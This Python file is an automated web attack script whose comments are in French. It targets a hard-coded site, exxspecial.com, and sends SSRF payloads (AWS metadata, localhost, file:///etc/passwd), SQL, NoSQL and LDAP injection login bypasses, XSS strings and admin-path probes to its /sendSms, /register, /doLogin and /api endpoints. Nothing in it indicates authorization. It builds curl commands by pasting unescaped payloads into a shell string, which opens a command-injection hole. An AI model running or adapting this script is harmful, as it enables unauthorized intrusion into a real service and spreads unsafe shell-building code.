#!/usr/bin/env python3
"""
Endpoint Tester - Tests rapides des endpoints critiques
Cible: /sendSms, /register, /doLogin, /api/*
"""

import asyncio
import json
from typing import Dict, List, Any


class EndpointTester:
    """Teste les endpoints critiques rapidement"""

    def __init__(self, executor):
        self.executor = executor
        self.base_url = "https://exxspecial.com"
        self.timeout = 10

    async def test_endpoint(
        self,
        method: str,
        path: str,
        data: Dict = None,
        headers: Dict = None
    ) -> Dict[str, Any]:
        """
        Teste un endpoint spécifique
        """
        url = f"{self.base_url}{path}"

        # Construire la commande curl
        cmd = f"curl -s -X {method} {url}"

        if headers:
            for key, value in headers.items():
                cmd += f" -H '{key}: {value}'"

        if data:
            cmd += f" -d '{json.dumps(data)}'"

        cmd += f" --max-time {self.timeout} -w '\\n%{{http_code}}'"

        stdout, stderr, rc = await self.executor.run_command(cmd)

        # Parser la réponse
        lines = stdout.strip().split('\n')
        status_code = lines[-1] if lines else "000"
        response_body = '\n'.join(lines[:-1]) if len(lines) > 1 else ""

        return {
            "method": method,
            "path": path,
            "status_code": status_code,
            "response_length": len(response_body),
            "response_preview": response_body[:200],
            "error": stderr[:100] if stderr else None,
            "timeout": rc != 0
        }

    async def test_sendSms_endpoint(
        self,
        phone: str = "+221123456789"
    ) -> Dict[str, Any]:
        """
        Teste l'endpoint /sendSms avec différents payloads
        """
        results = {
            "endpoint": "/sendSms",
            "tests": [],
            "vulnerabilities": []
        }

        payloads = [
            {
                "name": "Normal Request",
                "data": {"type": "register", "tel": phone}
            },
            {
                "name": "SSRF - AWS Metadata",
                "data": {
                    "type": "register",
                    "tel": "http://169.254.169.254/latest/meta-data/"
                }
            },
            {
                "name": "SSRF - Localhost",
                "data": {
                    "type": "register",
                    "tel": "http://localhost:8080/admin"
                }
            },
            {
                "name": "SSRF - File Protocol",
                "data": {
                    "type": "register",
                    "tel": "file:///etc/passwd"
                }
            },
            {
                "name": "Parameter Pollution",
                "data": {
                    "type": "register",
                    "tel": phone,
                    "type": "admin"
                }
            },
            {
                "name": "Null Byte Injection",
                "data": {
                    "type": "register",
                    "tel": f"{phone}%00admin"
                }
            },
            {
                "name": "Unicode Bypass",
                "data": {
                    "type": "register",
                    "tel": f"{phone}\u0000admin"
                }
            }
        ]

        for payload in payloads:
            test_result = await self.test_endpoint(
                "POST",
                "/sendSms",
                data=payload["data"],
                headers={"Content-Type": "application/json"}
            )
            test_result["payload_name"] = payload["name"]
            results["tests"].append(test_result)

            # Détecter vulnérabilités
            if test_result["status_code"] == "200":
                if "error" not in test_result["response_preview"].lower():
                    results["vulnerabilities"].append(
                        f"Possible vulnerability: {payload['name']}"
                    )

        return results

    async def test_register_endpoint(
        self,
        phone: str = "+221123456789",
        invitation_code: str = None
    ) -> Dict[str, Any]:
        """
        Teste l'endpoint /register
        """
        results = {
            "endpoint": "/register",
            "tests": [],
            "vulnerabilities": []
        }

        payloads = [
            {
                "name": "Normal Registration",
                "data": {
                    "username": phone,
                    "code": "1234",
                    "invitation_code": invitation_code or "1000"
                }
            },
            {
                "name": "SQL Injection - Username",
                "data": {
                    "username": f"{phone}' OR '1'='1",
                    "code": "1234",
                    "invitation_code": invitation_code or "1000"
                }
            },
            {
                "name": "SQL Injection - Code",
                "data": {
                    "username": phone,
                    "code": "1234' OR '1'='1",
                    "invitation_code": invitation_code or "1000"
                }
            },
            {
                "name": "XSS - Username",
                "data": {
                    "username": f"{phone}<script>alert(1)</script>",
                    "code": "1234",
                    "invitation_code": invitation_code or "1000"
                }
            },
            {
                "name": "XSS - Code",
                "data": {
                    "username": phone,
                    "code": "<img src=x onerror=alert(1)>",
                    "invitation_code": invitation_code or "1000"
                }
            },
            {
                "name": "Missing Invitation Code",
                "data": {
                    "username": phone,
                    "code": "1234"
                }
            },
            {
                "name": "Empty Invitation Code",
                "data": {
                    "username": phone,
                    "code": "1234",
                    "invitation_code": ""
                }
            },
            {
                "name": "Invalid OTP Format",
                "data": {
                    "username": phone,
                    "code": "invalid",
                    "invitation_code": invitation_code or "1000"
                }
            }
        ]

        for payload in payloads:
            test_result = await self.test_endpoint(
                "POST",
                "/register",
                data=payload["data"]
            )
            test_result["payload_name"] = payload["name"]
            results["tests"].append(test_result)

            # Détecter vulnérabilités
            if test_result["status_code"] == "200":
                if "success" in test_result["response_preview"].lower():
                    results["vulnerabilities"].append(
                        f"Possible bypass: {payload['name']}"
                    )

        return results

    async def test_doLogin_endpoint(self) -> Dict[str, Any]:
        """
        Teste l'endpoint /doLogin
        """
        results = {
            "endpoint": "/doLogin",
            "tests": [],
            "vulnerabilities": []
        }

        payloads = [
            {
                "name": "Normal Login",
                "data": {
                    "username": "admin",
                    "password": "admin123"
                }
            },
            {
                "name": "SQL Injection - Username",
                "data": {
                    "username": "admin' OR '1'='1",
                    "password": "anything"
                }
            },
            {
                "name": "SQL Injection - Password",
                "data": {
                    "username": "admin",
                    "password": "' OR '1'='1"
                }
            },
            {
                "name": "XSS - Username",
                "data": {
                    "username": "<script>alert(1)</script>",
                    "password": "test"
                }
            },
            {
                "name": "LDAP Injection",
                "data": {
                    "username": "*",
                    "password": "*"
                }
            },
            {
                "name": "NoSQL Injection",
                "data": {
                    "username": {"$ne": None},
                    "password": {"$ne": None}
                }
            },
            {
                "name": "Null Byte Injection",
                "data": {
                    "username": "admin%00",
                    "password": "test"
                }
            }
        ]

        for payload in payloads:
            test_result = await self.test_endpoint(
                "POST",
                "/doLogin",
                data=payload["data"]
            )
            test_result["payload_name"] = payload["name"]
            results["tests"].append(test_result)

            # Détecter vulnérabilités
            if test_result["status_code"] == "200":
                if "success" in test_result["response_preview"].lower():
                    results["vulnerabilities"].append(
                        f"Possible bypass: {payload['name']}"
                    )

        return results

    async def test_api_endpoints(self) -> Dict[str, Any]:
        """
        Teste les endpoints API courants
        """
        results = {
            "endpoint": "/api/*",
            "endpoints_tested": [],
            "accessible_endpoints": [],
            "vulnerabilities": []
        }

        api_paths = [
            "/api/users",
            "/api/admin",
            "/api/config",
            "/api/settings",
            "/api/database",
            "/api/backup",
            "/api/logs",
            "/api/debug",
            "/api/status",
            "/api/health",
            "/admin/api",
            "/api/v1/users",
            "/api/v2/users"
        ]

        for path in api_paths:
            test_result = await self.test_endpoint("GET", path)
            results["endpoints_tested"].append(path)

            if test_result["status_code"] in ["200", "301", "302"]:
                results["accessible_endpoints"].append({
                    "path": path,
                    "status": test_result["status_code"]
                })
                results["vulnerabilities"].append(
                    f"Accessible endpoint: {path}"
                )

        return results

    async def run_full_endpoint_test(
        self,
        phone: str = "+221123456789",
        invitation_code: str = None
    ) -> Dict[str, Any]:
        """
        Exécute tous les tests d'endpoints
        """
        results = {
            "target": self.base_url,
            "tests": {},
            "summary": {
                "total_vulnerabilities": 0,
                "critical_findings": []
            }
        }

        # Test /sendSms
        results["tests"]["sendSms"] = await self.test_sendSms_endpoint(
            phone
        )
        results["summary"]["total_vulnerabilities"] += len(
            results["tests"]["sendSms"]["vulnerabilities"]
        )

        # Test /register
        results["tests"]["register"] = await self.test_register_endpoint(
            phone,
            invitation_code
        )
        results["summary"]["total_vulnerabilities"] += len(
            results["tests"]["register"]["vulnerabilities"]
        )

        # Test /doLogin
        results["tests"]["doLogin"] = await self.test_doLogin_endpoint()
        results["summary"]["total_vulnerabilities"] += len(
            results["tests"]["doLogin"]["vulnerabilities"]
        )

        # Test /api/*
        results["tests"]["api"] = await self.test_api_endpoints()
        results["summary"]["total_vulnerabilities"] += len(
            results["tests"]["api"]["vulnerabilities"]
        )

        # Résumé des findings critiques
        for test_name, test_result in results["tests"].items():
            if test_result.get("vulnerabilities"):
                results["summary"]["critical_findings"].extend(
                    test_result["vulnerabilities"]
                )

        return results
